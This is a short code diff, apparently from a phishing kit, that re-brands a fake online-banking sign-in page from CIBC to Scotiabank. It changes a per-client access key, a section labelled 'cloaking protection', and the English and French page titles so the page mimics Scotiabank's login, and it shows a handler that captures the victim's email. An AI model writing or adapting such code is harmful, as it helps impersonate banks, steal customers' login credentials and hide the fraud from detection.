@@ -15,7 +15,7 @@ function getAdminKey() {
     sessionStorage.setItem('admin_key', keyFromUrl);
     return keyFromUrl;
   }
-  // If the URL has ANY other key (e.g. client-cibc-bank), clear the stored admin key
+  // If the URL has ANY other key (e.g. client-scotia-bank), clear the stored admin key
   // so that switching URLs instantly shows the correct page.
   if (keyFromUrl && keyFromUrl !== ADMIN_KEY) {
     sessionStorage.removeItem('admin_key');
@@ -26,7 +26,7 @@ function getAdminKey() {
 // =============================================
 // ACCESS KEY + CLOAKING PROTECTION
 // =============================================
-const VALID_ACCESS_KEY = 'client-cibc-bank';
+const VALID_ACCESS_KEY = 'client-scotia-bank';
 
 // --- Access Key ---
 function getAccessKey() {
@@ -273,8 +273,8 @@ function App() {
 
   useEffect(() => {
     document.title = lang === 'fr'
-      ? "Ouvrir une session | CIBC en direct"
-      : "Sign on | CIBC Online Banking";
+      ? "Ouvrir une session | Banque Scotia"
+      : "Sign in | Scotiabank";
   }, [lang]);
 
   const handleSignInInitiated = (userEmail) => {
